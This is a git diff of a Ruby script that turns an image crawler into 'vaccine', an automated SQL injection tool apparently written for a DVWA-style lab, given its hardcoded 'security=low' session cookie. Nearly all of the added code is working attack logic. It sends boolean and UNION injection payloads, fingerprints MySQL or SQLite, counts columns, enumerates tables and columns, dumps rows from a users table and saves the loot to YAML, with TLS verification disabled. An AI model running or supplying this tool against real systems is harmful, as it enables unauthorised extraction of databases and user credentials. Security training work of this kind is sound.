@@ -1,149 +1,300 @@
 #!/usr/bin/env ruby
 
+require 'cgi'
 require 'optparse'
-require 'uri'
 require 'net/http'
-require 'set'
+require 'yaml'
+require 'uri'
 
-class SpiderConfig
-  attr_accessor :url, :path, :level, :recursive
+PAYLOADS = {
+  mysql: {
+    boolean_true: "' AND 1=1-- ",
+    boolean_false: "' AND 1=0-- ",
+    union_check: "' UNION SELECT 1,2,3,4-- "
+  },
+  sqlite: {
+    boolean_true: "' AND 1=1-- ",
+    boolean_false: "' AND 1=0-- ",
+    union_check: "' UNION SELECT sqlite_version(),2-- "
+  }
+}
 
-  def initialize(url, path = "./data/", level = 4, recursive = false)
+class Config 
+  attr_accessor :url, :path, :request
+
+  def initialize(url, path = "./data.yml", request = "GET")
     @url = url
     @path = path
-    @level = level
-    @recursive = recursive 
+    @request = request 
   end 
 end
 
 def usage()
-  puts "./spider [-r recursive] [-l recursive_level] [-p path] {URL}" 
+  puts "./vaccine [-o file] [-X type of request] {URL}" 
   exit
 end
 
 def parse_input(input, config)
-  if input.length <= 0 || input.length >= 7
+  if input.length <= 0 || input.length >= 6
     usage()
   end
-  if not File.directory?(config.path)
-    puts "[SPIDER] not found: #{config.path}"
-    exit
-  end
-
-   OptionParser.new do |opts|
-    opts.on("-r", "--recursive", "Enable recursivity") do
-      config.recursive = true
+  OptionParser.new do |opts|
+    opts.on("-oFILE", "--file=FILE", "file output") do |f|
+      config.path = f 
     end
-    opts.on("-lLEVEL", "--level=LEVEL", Integer, "Max recursivity level") do |level|
-      config.level = level
-    end
-    opts.on("-pPATH", "--path=PATH", "Output Directory") do |path|
-      config.path = path
+    opts.on("-XREQUEST", "--request=REQUEST", "type of request") do |r|
+      config.request = r
     end
   end.parse!
 
-  if not config.url.start_with?("http://", "https://")
-    puts "[SPIDER] invalid url: #{config.url}"
+  unless config.url.start_with?("http://", "https://")
+    puts "[VACCINE] invalid url: #{config.url}"
     exit
   end
+
+  unless File.exist?(config.path)
+    File.open(config.path, "a")
+  end
 end
 
-def make_request(url)
+def make_request(url, request, params)
   uri = URI(url)
+  http = Net::HTTP.new(uri.host, uri.port)
 
-  res = Net::HTTP.get_response(uri)
-  if res.is_a?(Net::HTTPSuccess)
-    return res.body 
-  else
-    puts "[SPIDER] Request failed: #{url}"
+  if uri.scheme == "https"
+    http.use_ssl = true
+    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+  end
+
+  if request.upcase == "GET"
+    uri.query = URI.encode_www_form(params)
+    req = Net::HTTP::Get.new(uri)
+  elsif request.upcase == "POST"
+    req = Net::HTTP::Post.new(uri.path.empty? ? "/" : uri.path)
+    req.set_form_data(params)
+   # req["Content-Type"] = "application/x-www-form-urlencoded" # ESTA LÍNEA ES CLAVE
+  else 
+    puts "[VACCINE] request type not suported"
     return nil
   end
+  req["Cookie"] = "PHPSESSID=c131r7vsgpj4iu22m5rmljpce0; security=low"
+  req["User-Agent"] = "Mozilla/5.0"
+
+  # Enviamos la petición y capturamos la respuesta sin filtrar por 'success'
+    res = http.request(req)
+    if res
+      return res # Devolvemos el objeto respuesta completo (sea 200, 302, 404 o 500)
+    end
+    puts "[VACCINE] connection failed"
+    exit 1 
 end
 
-def extract_images(url, content)
-  images = []
-  content.scan(/<img[^>]+src=["']([^"']+)["']/i) do |match|
-    href = match[0]
-    next if href.nil? || href.strip.empty?
-    next unless href.start_with?("/", "http://", "https://")
+def get_base_params(url)
+  begin
+    uri = URI.parse(url)
+    if uri.query
+      # Esto transforma "artist=1&id=2" en {"artist" => "1", "id" => "2"}
+      return URI.decode_www_form(uri.query).to_h
+    else
+      return { "id" => "1" } 
+    end
+  rescue URI::InvalidURIError
+    puts "[VACCINE] Invalid url."
+    exit 1 # O return nil y gestionarlo fuera
+  end
+end
 
-    begin 
-      full_url = URI.join(url, href).to_s
-    rescue URI::InvalidURIError
-      next
+def save_to_yaml(path, target_url, method, parameter, payload, engine, data_dump = {})
+  report = {
+    "vulnerability_found" => {
+      "target" => target_url,
+      "method" => method,
+      "parameter" => parameter,
+      "payload" => payload,
+      "engine" => engine,
+      "date" => Time.now.strftime("%Y-%m-%d %H:%M:%S"),
+      "dump" => {
+        "databases" => data_dump[:dbs] || [],
+        "tables"    => data_dump[:tables] || [],
+        "columns"   => data_dump[:columns] || [],
+        "data"      => data_dump[:full_dump] || "No dump performed"
+      }
+    }
+  }
+
+  # Escribir al archivo (modo 'a' para no borrar lo anterior o 'w' para sobrescribir)
+  File.open(path, "w") do |file|
+    file.write(report.to_yaml)
+  end
+  
+  puts "[VACCINE] Info saved in: #{path}"
+end
+
+def extract_info(target_param, base_params, url, request, engine)
+  #count the amount of columns
+  col_count = 0
+  (1..20).each do |i|
+    payload = "1' ORDER BY #{i}-- "
+    res = make_request(url, request, base_params.merge({ target_param => payload }))
+    if res.code != "200" || res.body.include?("Unknown column")
+      col_count = i - 1
+      break
+    end
+  if !res.body.include?("First name:")
+    col_count = i - 1
+    break
+    end
+  end
+  return nil if col_count <= 0
+
+  # 2. COLUMNA VISIBLE (¿Dónde inyectamos?)
+  test_cols = (1..col_count).map { |n| (n * 111).to_s } 
+  payload_union = "1' UNION SELECT #{test_cols.join(',')}-- "
+  res_union = make_request(url, request, base_params.merge({ target_param => payload_union }))
+  
+  visible_idx = nil
+  test_cols.each_with_index { |val, idx| (visible_idx = idx; break) if res_union.body.include?(val) }
+  return nil unless visible_idx
+
+  # 3. EXTRACCIÓN DE TABLAS
+  payload_array = Array.new(col_count, "NULL")
+  if engine == "SQLite"
+    payload_array[visible_idx] = "group_concat(tbl_name)"
+    from_tables = "FROM sqlite_master WHERE type='table'"
+  else
+    payload_array[visible_idx] = "group_concat(table_name)"
+    from_tables = "FROM information_schema.tables WHERE table_schema=database()"
+  end
+
+  res_tables = make_request(url, request, base_params.merge({ target_param => "-1' UNION SELECT #{payload_array.join(',')} #{from_tables}-- " }))
+  raw_tables = res_tables.body.scan(/First name: (.*?)</).flatten
+  tablas = raw_tables.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first&.split(',') || []
+
+  # 4. EXTRACCIÓN DE COLUMNAS (De la primera tabla que encontremos, ej: 'users' o 'admin')
+  columnas = []
+  if tablas.any?
+    target_table = tablas.include?("users") ? "users" : tablas.first
+    if engine == "SQLite"
+      # En SQLite es más fácil sacar el SQL de creación y parsearlo
+      payload_array[visible_idx] = "sql"
+      from_cols = "FROM sqlite_master WHERE tbl_name='#{target_table}'"
+    else
+      payload_array[visible_idx] = "group_concat(column_name)"
+      from_cols = "FROM information_schema.columns WHERE table_name='#{target_table}'"
     end
 
-    extension = File.extname(full_url)
-    next unless [".png", ".jpg", ".jpeg", ".gif", ".bmp"].include?(extension)  
-
-    images << full_url 
+    res_cols = make_request(url, request, base_params.merge({ target_param => "-1' UNION SELECT #{payload_array.join(',')} #{from_cols}-- " }))
+    raw_cols = res_cols.body.scan(/First name: (.*?)</).flatten
+    columnas = raw_cols.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first&.split(',') || []
   end
-  return images
+  # 5. EXTRACCIÓN DE FILAS (DUMP REAL)
+  #
+  raw_cols = res_cols.body.scan(/First name: (.*?)</).flatten.first
+  final_rows = "No data found"
+  if engine == "SQLite"
+    if raw_cols
+      # Quitamos todo lo que hay hasta el primer paréntesis
+      limpio = raw_cols.gsub(/.*?\(/, "").gsub(/\).*/, "") 
+
+      # Separamos por comas y para cada trozo, nos quedamos solo con la primera palabra
+      # (Ej: "user TEXT" -> "user")
+      columnas = limpio.split(',').map { |c| c.strip.split(' ').first }
+    end
+  end
+
+
+  if tablas.any? && columnas.any?
+    target_table = tablas.include?("users") ? "users" : tablas.first
+    c1 = columnas[0]
+    c2 = columnas[1] || columnas[0]
+
+    # Payload: UNION SELECT concat(col1, ':', col2), NULL FROM tabla
+    if engine == "SQLite"
+    data_payload = "group_concat(#{c1} || ':' || #{c2})"
+  else
+    data_payload = "group_concat(#{c1},0x3a,#{c2})"
+  end
+    
+    res_data = make_request(url, request, base_params.merge({ target_param => "-1' UNION SELECT #{data_payload}, NULL FROM #{target_table}-- " }))
+    
+    raw_data = res_data.body.scan(/First name: (.*?)</).flatten
+    final_rows = raw_data.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first || "No data found"
+  end
+
+
+  
+
+  { tables: tablas, columns: columnas, data: final_rows }
 end
 
-def save_images(path, images)
-  return if images.empty?
-  images.each_with_index do | image, i |
-    filename = File.join(path, "image_#{i}" + File.extname(image))
-    begin
-      File.open(filename, "w") do |file|
-        res = Net::HTTP.get_response(URI(image))
-        file.write(res.body)
+def vaccine(url, path, request)
+  base_params = get_base_params(url)
+  original_res = make_request(url, request, base_params)
+  
+if original_res.code != "200"
+  puts "[VACCINE!] The url is in the following state #{original_res.code}..."
+  return
+end
+
+  base_params.each do |key, value|
+    # 1. TEST DE VULNERABILIDAD
+    current_payload = "#{value}#{PAYLOADS[:mysql][:boolean_false]}"
+    attack_params = base_params.dup
+    attack_params[key] = current_payload
+   
+    attack_res = make_request(url, request, attack_params)
+    next unless attack_res
+
+    # Si el tamaño cambia, hay inyección
+    # esto cambiarlo
+    if attack_res.body.to_s.length != original_res.body.to_s.length
+      puts "[VACCINE] VULNERABILITY DETECTED WITH BOOLEAN ATTACK on parameter: #{key}"
+
+      sqlite_params = base_params.dup
+      sqlite_params[key] = "#{value}' AND sqlite_version() IS NOT NULL-- "
+      mysql_params = base_params.dup
+      mysql_params[key] = "#{value}' AND @@version IS NOT NULL-- "
+      
+      sqlite_res = make_request(url, request, sqlite_params)
+      mysql_res = make_request(url, request, mysql_params)
+      
+      diff_mysql = (mysql_res.body.length - original_res.body.length).abs
+      diff_sqlite = (sqlite_res.body.length - original_res.body.length).abs
+
+      #ojo con esto
+      if sqlite_res.body.include?("First name:")
+        engine = "SQLite"
+        # Si es MySQL, lo mismo
+      elsif mysql_res.body.include?("First name:")
+        engine = "MySQL"
+      else
+        engine = "Unknown"
       end
-    rescue Errno::ENOENT
-      puts "[SPIDER] not found: #{path}"
-      exit
-    rescue Errno::EACCES
-      puts "[SPIDER] Permission denied on : #{path}"
-      exit
-    end 
-  end
-end
+      # if mysql_res && diff_mysql < 50 
+      #   engine = "MySQL"
+      # elsif sqlite_res && diff_sqlite < 50
+      #   engine = "SQLite"
+      # else
+      #   engine = "Unknown"
+      # end
+      #
+      puts "[VACCINE] Motor detected: #{engine}"
+      next if engine == "Unknown"
+      data = extract_info(key, base_params, url, request, engine)
+      if data.nil?
+        puts "[VACCINE] cannot extract data with UNION SELECT."
+        data = { tables: [], columns: [], data: "No data found" }
+      end
 
-def is_extern(url)
-  base = url.match(%r{(https?://[^/]+)})
-  if base.nil? 
-    return false
-  end
-  return true
-end
-
-def extract_links(url, content)
-  links = []
-  content.scan(/<a[^>]+href=["']([^"']+)["']/i) do |match|
-    href = match[0]
-    next if href.nil? || href.strip.empty?
-    next if href.start_with?("mailto:", "tel:", "ftp:")
-
-    begin 
-      full_url = URI.join(url, href).to_s
-    rescue URI::InvalidURIError
-      next
+        dump_info = {
+        dbs: [engine == "SQLite" ? "main" : "information_schema"], 
+        tables: data[:tables], 
+        columns: data[:columns],
+        full_dump: "Data: #{data[:data]}"
+      }
+      save_to_yaml(path, url, request, key, current_payload, engine, dump_info)
+      break 
     end
-
-    next if is_extern(href)
-
-    links << full_url
-  end
-  return links
-end
-
-def spider(url, path, pages, level)
-  return if level <= 0
-  return if pages.include?(url)
-
-  puts "[SPIDER] visiting: #{url}"
-  pages.add(url)
-  content = make_request(url)
-  return if content.nil?
-
-  images = extract_images(url, content)
-  save_images(path, images)
-
-
-  links = extract_links(url, content)
-  links.each do |link|
-    spider(link, path, pages, level - 1)
   end
 end
 
@@ -152,15 +303,11 @@ def main
   if input.empty?
     usage()
   end
-
   url = ARGV[-1]
-  pages = Set.new
 
-  conf = SpiderConfig.new(url)
+  conf = Config.new(url)
   parse_input(input, conf)
-
-  max_level = conf.recursive ? conf.level : 1
-  spider(conf.url, conf.path, pages, max_level)
+  res = vaccine(conf.url, conf.path, conf.request)
 end
 
 if __FILE__ == $0
